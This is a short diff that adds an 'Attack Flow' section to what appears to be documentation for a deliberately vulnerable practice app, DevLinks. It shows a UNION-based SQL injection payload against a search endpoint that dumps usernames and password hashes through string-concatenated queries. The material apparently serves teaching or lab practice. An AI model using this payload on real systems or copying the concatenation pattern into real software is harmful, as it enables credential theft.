@@ -10,6 +10,22 @@
 
 ---
 
+## Attack Flow
+
+```
+Attacker sends: GET /api/search?q=' UNION SELECT id,username,password FROM users--
+        ↓
+DevLinks (3025) builds query by string concatenation:
+  SELECT * FROM links WHERE title LIKE '%[INPUT]%'
+  → SELECT * FROM links WHERE title LIKE '%' UNION SELECT id,username,password FROM users--%'
+        ↓
+Database executes both SELECT statements
+        ↓
+All usernames + hashed passwords returned in search results
+```
+
+---
+
 ## Setup
 
 ```bash
